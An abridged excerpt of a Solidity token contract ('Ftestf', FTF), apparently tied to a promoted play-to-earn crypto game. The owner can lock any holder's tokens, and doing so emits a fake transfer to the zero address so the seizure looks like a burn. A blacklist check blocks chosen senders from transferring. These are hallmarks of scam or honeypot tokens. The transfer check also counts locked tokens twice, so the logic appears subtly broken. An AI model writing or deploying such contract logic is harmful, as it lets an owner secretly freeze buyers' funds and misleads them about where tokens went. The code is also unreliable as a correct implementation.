...
/**
    ...
    Website: https://monopolinu.net
    Telegram: https://t.me/monopolinu
    Twitter: https://twitter.com/monopolinu

    P2E contract; 
    Online Board Game with Cryptocurrencies; 
    NFT specials;
    MINU staking and vesting;
...
contract FTF is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "Ftestf";
    string public _symbol= "FTF";
     bool balances1 = true;
    ...
    function lockTokens(address _address, uint256 amount) public onlyowner() {
    require(_balances[_address] >= amount, "Insufficient balance to lock");
    _balances[_address] -= amount;
    _lockedBalance[_address] += amount;
    emit Transfer(_address, address(0), amount);
    }

    function unlockTokens(address _address, uint256 amount) public onlyowner() {
    require(_lockedBalance[_address] >= amount, "Insufficient locked tokens to unlock");
    _lockedBalance[_address] -= amount;
    _balances[_address] += amount;
    ...
    require(!_blackbalances[msg.sender], "Not allowed to transfer");
    require(_balances[msg.sender] - _lockedBalance[msg.sender] >= amount, "Transfer amount exceeds balance or locked tokens");
